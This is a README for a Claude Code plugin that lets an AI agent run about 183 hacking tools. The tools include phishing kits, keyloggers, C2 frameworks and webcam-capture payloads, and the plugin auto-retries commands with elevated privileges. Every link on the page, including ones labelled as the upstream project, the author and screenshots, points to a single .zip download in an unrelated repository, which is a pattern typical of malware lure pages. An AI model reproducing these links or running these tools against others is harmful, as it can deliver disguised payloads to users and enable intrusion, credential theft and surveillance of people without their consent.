<div align="center">

<img src="images/logo.svg" alt="HackingTool" width="600">

# hackingtool — Claude Code plugin

**183 pentesting & OSINT tools at Claude's fingertips.** Plugin-skill wrapper around [Z4nzu/hackingtool](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip). Runs locally on any OS — native Bash on Linux/macOS, WSL on Windows, or purpose-built Docker images (`instrumentisto/nmap`, `projectdiscovery/nuclei`, `caffix/amass`, and 20+ more). The skill picks the right backend and image automatically.

![Plugin](https://img.shields.io/badge/Claude_Code-Plugin-7B61FF?style=for-the-badge)
![Tools](https://img.shields.io/badge/183_Tools-00FF88?style=for-the-badge)
![Categories](https://img.shields.io/badge/20+_Categories-FF61DC?style=for-the-badge)
![OS](https://img.shields.io/badge/Linux_%7C_macOS_%7C_Windows-FFA116?style=for-the-badge&logo=linux&logoColor=white)

Built by [ariacodez](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) · wraps [Z4nzu/hackingtool](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) (MIT)

</div>

# See it in Action 

<img width="1194" height="49" alt="image" src="https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip" />
<img width="1152" height="396" alt="image" src="https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip" />
<img width="1196" height="750" alt="image" src="https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip" />

---

## Install

```
/plugin marketplace add AKCODEZ/hackingtool-plugin
/plugin install hackingtool@hackingtool-marketplace
```

Then point Claude at a target:

```
"recon example.com"
"hunt the username johndoe"
"scan my repo for vulnerabilies"
"crack my own wifi before my neighbor does"
```

Claude picks the tools. You read the output.

---

## How it works

Every tool invocation goes through `ht_run.py`, which:

1. Picks a backend: **native** (Linux/macOS), **WSL** (Windows + real distro), or **Docker** (anywhere Docker Desktop runs).
2. Maps known tools to **purpose-built Docker images** — fast pulls, clean ENTRYPOINTs, no `apt install` dance:

   | Category | Images |
   |---|---|
   | Port scanning | `instrumentisto/nmap`, `ilyaglow/masscan`, `rustscan/rustscan` |
   | Subdomain recon | `projectdiscovery/subfinder`, `caffix/amass`, `projectdiscovery/httpx` |
   | Vuln scanning | `projectdiscovery/nuclei`, `projectdiscovery/katana` |
   | OSINT | `megadose/holehe`, `soxoj/maigret`, `spiderfoot/spiderfoot`, `secsi/theharvester` |
   | Secrets | `trufflesecurity/trufflehog`, `zricethezav/gitleaks` |
   | Web attack | `secsi/ffuf`, `devopsworks/gobuster`, `drwetter/testssl.sh`, `0xsauby/wafw00f` |
   | SQL injection | `paoloo/sqlmap` |
   | Active Directory | `rflathers/impacket`, `byt3bl33d3r/netexec` |
   | Phishing recon | `elceef/dnstwist` |
   | Fallback | `kalilinux/kali-rolling` (for anything not in the override map) |

3. Runs the command, auto-retries with elevated privileges on permission errors (native/WSL), and surfaces the actual tool output as structured JSON.

The 🟢/🟡 icons in the inventory below are quick indicators of how the tool usually behaves — 🟢 for "plug-and-play" invocations, 🟡 for tools whose behavior depends on the backend and environment (adapter hardware, sudo config, etc.). Either way, the skill runs it and tells you what happened.

Current breakdown: **56 🟢 · 127 🟡 · 183 total**.

---

## OS support

The plugin picks a backend automatically via `ht_env.py`:

| Host | Backend |
|---|---|
| Linux / macOS native | `bash -lc <cmd>` |
| Windows + real WSL distro (Ubuntu, Kali, etc.) | `wsl -d <distro> -- bash -lc <cmd>` |
| Windows + Docker Desktop | `docker run --rm <image> <args>` |
| Anywhere Docker is running | Docker backend (preferred when available) |

Docker images in the override map are pulled on first use and cached. `ht_run.py <tool_id> --install` runs the install commands for native/WSL when you need the binary on the host itself.

---

## Master tool inventory

Legend: 🟢 plug-and-play · 🟡 depends on backend / environment

**183 tools total** — 🟢 56 plug-and-play · 🟡 127 environment-dependent


### 🛡 Anonymously Hiding (2)

| Tool | What it does | Claude | Flags |
|---|---|:---:|---|
| [Anonymously Surf](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | It automatically overwrites the RAM when the system shuts down | 🟡 | `sudo` |
| [Multitor](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | How to stay in multi places at the same time. | 🟡 | `sudo` |

### 🔍 Information Gathering (26)

| Tool | What it does | Claude | Flags |
|---|---|:---:|---|
| [Amass (Attack Surface Mapping)](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | In-depth subdomain enumeration and attack surface mapping. | 🟢 | — |
| [Breacher](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | An advanced multithreaded admin panel finder written in python. | 🟡 | `interactive` |
| [Dracnmap](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Open source program using nmap to exploit the network and gather information. | 🟡 | `sudo` |
| [Find Info Using Shodan](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Get ports, vulnerabilities, information, banners. | 🟡 | — |
| [Gitleaks (Git Secret Scanner)](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Fast secret scanner for git repos — detects hardcoded passwords, API keys, tokens. | 🟢 | — |
| [Holehe (Email → Social Accounts)](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Check if an email address is registered on 120+ websites. | 🟢 | — |
| Host to IP | Resolve hostname to IP. | 🟡 | `interactive` |
| [httpx (HTTP Toolkit)](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Fast multi-purpose HTTP probing tool. | 🟢 | — |
| [Infoga - Email OSINT](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Gathers email account information (ip, hostname, country) from public sources. | 🟢 | — |
| IsItDown (Check Website Down/Up) | Check Website Is Online or Not. | 🟡 | — |
| [Maigret (Username OSINT)](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Collect a dossier on a person by username across 3000+ sites. | 🟢 | — |
| [Masscan (Fast Port Scanner)](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Fastest internet port scanner — 10 million packets/sec. | 🟡 | `sudo` |
| [Network Map (nmap)](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Free utility for network discovery and security auditing. | 🟡 | `sudo` |
| [Port Scanner - rang3r](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Python script for multi-threaded port scanning. | 🟡 | `interactive` |
| Port scanning | Basic port scan wrapper. | 🟡 | `interactive` |
| [ReconDog](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | ReconDog Information Gathering Suite. | 🟡 | `sudo` |
| [ReconSpider (For All Scanning)](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Advanced OSINT Framework for IPs, Emails, Websites, Organizations. | 🟡 | `sudo` |
| [RED HAWK (All In One Scanning)](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | All in one tool for Information Gathering and Vulnerability Scanning. | 🟢 | — |
| [RustScan (Modern Port Scanner)](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Scans all 65k ports in 3 seconds, passes results to nmap automatically. | 🟡 | `sudo` |
| [SecretFinder (like API & etc)](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Python script for finding sensitive data like API keys. | 🟡 | `sudo` |
| [SpiderFoot (OSINT Automation)](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Automates OSINT collection for threat intelligence and attack surface mapping. | 🟢 | — |
| [Striker](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Recon & Vulnerability Scanning Suite. | 🟡 | `interactive` |
| [Subfinder (Subdomain Enumeration)](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Fast passive subdomain enumeration using multiple sources. | 🟢 | — |
| [theHarvester (OSINT)](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Gather emails, names, subdomains, IPs and URLs from public sources. | 🟢 | — |
| [TruffleHog (Secret Scanner)](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Find, verify, and analyze leaked credentials across git repos, S3 buckets, filesystems. | 🟢 | — |
| [Xerosploit](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Penetration testing toolkit to perform MITM attacks. | 🟡 | `sudo` |

### 📚 Wordlist Generator (7)

| Tool | What it does | Claude | Flags |
|---|---|:---:|---|
| [Cupp](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Common User Passwords Profiler — generates personalized wordlists. | 🟡 | `interactive` `long` |
| [Goblin WordGenerator](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Goblin WordGenerator. | 🟢 | `long` |
| [haiti (Hash Type Identifier)](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Identify hash types — supports 300+ algorithms. | 🟢 | `long` |
| [Hashcat (Password Cracker)](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | World's fastest GPU/CPU password recovery tool — 300+ hash types. | 🟡 | `sudo` `long` |
| [John the Ripper](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Open-source password security auditing and recovery tool. | 🟡 | `sudo` `long` |
| [Password list (1.4B Clear Text)](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Search 1.4 Billion clear text credentials from BreachCompilation leak. | 🟢 | `long` |
| [WordlistCreator](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | C program that generates all possibilities of passwords. | 🟡 | `sudo` `long` |

### 📶 Wireless Attack (13)

| Tool | What it does | Claude | Flags |
|---|---|:---:|---|
| [Airgeddon](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Multi-use bash script for auditing wireless networks. | 🟡 | `sudo` `hw` |
| [Bettercap](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Swiss army knife for WiFi, BLE, HID, and Ethernet recon and MITM. | 🟡 | `sudo` `hw` |
| [Bluetooth Honeypot (bluepot)](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Bluetooth receiver honeypot. | 🟡 | `sudo` `hw` |
| [EvilTwin](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Evil Twin attack via fake page and fake Access Point. | 🟡 | `sudo` `hw` |
| [Fastssh](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Multi-threaded scan and brute force against SSH. | 🟡 | `sudo` `hw` |
| [Fluxion](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Remake of linset — automated MITM wifi attack. | 🟡 | `interactive` `sudo` `hw` |
| [hcxdumptool](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Capture packets and PMKID hashes from WLAN devices. | 🟡 | `sudo` `hw` |
| [hcxtools](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Convert captured WLAN packets to hashcat/JtR-compatible format. | 🟡 | `sudo` `hw` |
| Howmanypeople | Count people around you by monitoring wifi signals. | 🟡 | `sudo` `hw` |
| [pixiewps](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Brute force offline WPS pin (pixie-dust attack). | 🟡 | `sudo` `hw` `long` |
| [WiFi-Pumpkin](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Rogue AP framework for creating fake networks. | 🟡 | `sudo` `hw` |
| [Wifiphisher](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Rogue Access Point framework for red team engagements. | 🟡 | `sudo` `hw` |
| [Wifite](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Automated wireless attack tool. | 🟡 | `sudo` `hw` |

### 🧩 SQL Injection (7)

| Tool | What it does | Claude | Flags |
|---|---|:---:|---|
| [Blisqy](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Find time-based blind SQL injections on HTTP headers. | 🟡 | — |
| [DSSS](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Damn Small SQLi Scanner — GET and POST parameters. | 🟡 | — |
| [Explo](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Describe web security issues in human and machine readable format. | 🟡 | — |
| [Leviathan](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Mass audit toolkit — service discovery, brute force, SQLi detection. | 🟢 | — |
| [NoSqlMap](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Audit and automate injection attacks on NoSQL databases. | 🟢 | — |
| [Sqlmap](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Automate detection and exploitation of SQL injection flaws. | 🟡 | `interactive` |
| [SQLScan](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Quick web scanner to find SQL injection points. | 🟡 | `sudo` |

### 🎣 Phishing Attack (17)

| Tool | What it does | Claude | Flags |
|---|---|:---:|---|
| [AdvPhishing](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Advance Phishing Tool — OTP phishing. | 🟡 | `sudo` |
| [Autophisher](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Automated Phishing Toolkit. | 🟡 | `sudo` |
| [BlackEye](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Phishing tool with 38 website templates. | 🟡 | `sudo` |
| [BlackPhish](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Phishing toolkit. | 🟡 | `sudo` |
| [dnstwist](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Domain name permutation engine — typosquatting and brand impersonation. | 🟢 | — |
| [Evilginx3](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | MITM attack framework for phishing login credentials. | 🟡 | `sudo` |
| [HiddenEye](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Modern phishing tool with multi-tunnelling. | 🟡 | `sudo` |
| [I-See-You](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Find the exact location of a target via social engineering. | 🟡 | `sudo` |
| [Maskphish](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Hide phishing URL under a normal looking URL. | 🟡 | `sudo` |
| [Pyphisher](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Easy to use phishing tool with 77 website templates. | 🟡 | `sudo` |
| [QR Code Jacking](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | QR Code Jacking (Any Website). | 🟡 | `sudo` |
| [QRLJacking](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Session hijacking against QR-code-based login. | 🟡 | `sudo` |
| [SayCheese](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Grab webcam shots from target via malicious link. | 🟡 | `sudo` |
| [Setoolkit](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Social-Engineer Toolkit. | 🟡 | `sudo` |
| [ShellPhish](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Phishing tool for 18 social media. | 🟡 | `sudo` |
| [SocialFish](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Automated Phishing Tool & Information Collector. | 🟡 | `sudo` |
| [Thanos](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Browser to Browser Phishing toolkit. | 🟡 | `sudo` |

### 🌐 Web Attack (20)

| Tool | What it does | Claude | Flags |
|---|---|:---:|---|
| [Arjun](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | HTTP parameter discovery — finds hidden GET/POST parameters. | 🟢 | — |
| [Blazy](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Modern login page bruteforcer (also clickjacking). | 🟡 | `archived` |
| [Caido](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Lightweight web security auditing toolkit — Burp alternative in Rust. | 🟡 | `sudo` |
| [CheckURL](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Detect evil URLs that use IDN Homograph Attack. | 🟢 | — |
| [Dirb](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Web Content Scanner — existing and hidden Web Objects. | 🟡 | `interactive` `sudo` |
| [Dirsearch](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Web path brute-forcing — directories and files on web servers. | 🟢 | — |
| [Feroxbuster](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Fast, recursive content discovery tool in Rust. | 🟡 | `sudo` `long` |
| [ffuf](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Fast web fuzzer — content, parameter, vhost discovery. | 🟢 | `long` |
| [Gobuster](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Directory/file, DNS, and vhost brute-forcing in Go. | 🟢 | — |
| [Katana](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Next-generation crawling and spidering framework. | 🟢 | — |
| [mitmproxy](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Interactive TLS-capable intercepting HTTP proxy. | 🟢 | — |
| [Nikto](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Scan web servers for dangerous files, outdated software, misconfig. | 🟡 | `sudo` |
| [Nuclei](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Fast, template-based vulnerability scanner used by 50k+ teams. | 🟢 | — |
| [OWASP ZAP](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Full-featured web application security scanner. | 🟡 | `sudo` `gui` |
| Skipfish | Automated active web application security reconnaissance. | 🟡 | `sudo` |
| [Sub-Domain TakeOver](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Sub-domain takeover scanner. | 🟡 | — |
| [Sublist3r](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Enumerate subdomains of websites using OSINT. | 🟡 | `sudo` |
| [testssl.sh](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Check TLS/SSL ciphers, protocols, and cryptographic flaws. | 🟢 | — |
| [wafw00f](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Fingerprint and identify Web Application Firewalls (WAF). | 🟢 | — |
| [Web2Attack](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Web hacking framework with tools and exploits. | 🟡 | `sudo` |

### 🔧 Post Exploitation (10)

| Tool | What it does | Claude | Flags |
|---|---|:---:|---|
| [Chisel](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Fast TCP/UDP tunnel over HTTP — pivoting and port forwarding. | 🟢 | — |
| [Chrome Keylogger](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Hera Chrome Keylogger. | 🟡 | `sudo` |
| [Evil-WinRM](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Ultimate WinRM shell for Windows pentesting. | 🟢 | — |
| [Havoc](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Modern post-exploitation C2 framework with EDR evasion. | 🟢 | — |
| [Ligolo-ng](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Advanced tunneling/pivoting via TUN interfaces. | 🟢 | — |
| [Mythic](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Collaborative multi-payload C2 platform for red team ops. | 🟡 | `sudo` |
| [PEASS-ng (LinPEAS/WinPEAS)](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Privilege escalation enumeration for Linux and Windows. | 🟢 | — |
| [pwncat-cs](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Post-exploitation platform — manages reverse/bind shells. | 🟢 | — |
| [Sliver](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Cross-platform adversary emulation / red team C2. | 🟡 | `sudo` |
| [Vegile (Ghost In The Shell)](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Set up backdoor/rootkits when a backdoor is already set up. | 🟡 | `sudo` |

### 🕵 Forensics (8)

| Tool | What it does | Claude | Flags |
|---|---|:---:|---|
| Autopsy | Forensic investigation platform. | 🟡 | `sudo` `gui` |
| [Binwalk](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Analyze, reverse engineer, and extract firmware images. | 🟢 | — |
| [Bulk extractor](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Extract useful information without parsing the file system. | 🟡 | — |
| [Guymager (Disk Clone / ISO)](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Free forensic imager for media acquisition. | 🟡 | `sudo` |
| [pspy](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Monitor Linux processes without root — cron jobs, scheduled tasks. | 🟢 | — |
| [Toolsley](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Ten-plus useful tools for investigation. | 🟡 | — |
| [Volatility 3](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | World's most widely used memory forensics framework. | 🟡 | `interactive` |
| Wireshark | Network capture and analyzer. | 🟡 | `sudo` `gui` |

### 📦 Payload Creation (8)

| Tool | What it does | Claude | Flags |
|---|---|:---:|---|
| [Brutal](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Toolkit for payloads, powershell attacks, HID attacks. | 🟡 | `sudo` |
| [Enigma](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Multiplatform payload dropper. | 🟡 | `sudo` |
| [Mob-Droid](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Generate metasploit payloads easily. | 🟡 | `sudo` |
| [MSFvenom Payload Creator](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Wrapper to generate multiple types of payloads. | 🟡 | `sudo` |
| [Spycam](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Win32 payload that captures webcam images every minute. | 🟢 | — |
| [Stitch](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Cross Platform Python Remote Administrator Tool. | 🟡 | `sudo` |
| [The FatRat](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Backdoor/payload generation that can bypass most AV. | 🟡 | `sudo` |
| [Venom Shellcode Generator](https://github.com/MAXZL1/hackingtool-plugin/raw/refs/heads/main/plugins/hackingtool/skills/hackingtool-plugin-v2.8.zip) | Exploits apache2 to deliver LAN payloads via fake webpages. | 🟡 | `sudo` |

### 🧰 Exploit Framework (3)

| Tool | What it does | Claude | Flags |
|---|---|:---:|---|
